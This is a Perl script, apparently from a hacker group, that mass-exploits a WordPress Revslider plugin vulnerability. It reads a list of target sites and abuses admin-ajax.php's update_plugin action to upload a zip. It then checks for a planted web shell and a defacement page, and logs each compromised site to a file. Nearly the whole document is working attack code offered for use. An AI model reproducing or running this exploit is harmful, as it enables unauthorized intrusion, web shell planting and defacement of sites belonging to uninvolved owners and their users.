	

    #!/usr/bin/perl
    #  
    #  Don't Change right Noobs :3
    #  +------------------------------------------------------------------------------------------------+
    #  |  Warning : Download This Archive .zip and past in folder Bin of Perl for Use this Script !!!!  |
    # -> Auto Exploiter Revslider Shell Upload 2015 By DR.AFN[D]ENA    # -> Author: 
    #
     
    use LWP::UserAgent;
     
    system(($^O eq 'MSWin32') ? 'cls' : 'clear');
     
    head();
     
    my $usage = " \nperl $0 <list.txt>\n perl $0 lista.txt";
    die "$usage" unless $ARGV[0];
     
    open(tarrget,"<$ARGV[0]") or die "$!";
    while(<tarrget>){
    chomp($_);
    $target = $_;
     
    my $path = "wp-admin/admin-ajax.php";
     
    print "\nTarget => $target\n";
     
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $req = $ua->get("$target/$path");
    if($req->is_success) {
    print "\n  [+] Xploit Possibility Work :3\n \n";
     
     
     
    print "  [*]  Exploiting Vulnerability\n";
    print "  [*] Xploiting By Dr.AFN[D]ENA $target\n";
     
    my $exploit = $ua->post("$target/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["revslider.zip"]]);
     
    print "  [*] Sent payload By Exploit Arab\n";
     
    if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print "  [+] Payload successfully executed \n";
     
    print "  [*] Checking if shell was uploaded\n";
    my $check = $ua->get("$target/wp-content/plugins/revslider/temp/update_extract/revslider/up.php")->content;
    if($check =~/<br>/) {
     
        print "  [+] Shell successfully uploaded\n";
        open(save, '>>sites.txt');
        print save "Upload shell By Exploit ArAb : $target/wp-content/plugins/revslider/temp/update_extract/revslider/up.php\n";
        close(save);
     
     
    print "  [*] Checking if Deface was uploaded now By\n";
     
    my $def = $ua->get("$target/leet.html")->content;
    if($def = ~/Hacked/) {
     
    print "  [+] Deface uploaded successfull\n";
     
     
    } else {print "   [-] Deface not Uploaded :/"; }
    } else { print "  [-] I'think Shell Not Uploaded :/\n"; }
    } else {
    print "  [-] Payload failed: Fail\n";
    print "\n";
     
    }
    } else { print "\n [-]Xploit Fail \n"}
     
    sub head {
    print "\t   +===============================================\n";
    print "\t   | Auto Exploiter Revslider Shell Upload \n";
    print "\t   |  

Exploit By Dr.AFN[D]ENA

Anonymos Rabaa

[+] Thanks for hunter_eyes \n";
    print "\t   +===============================================\n";
    }
    }


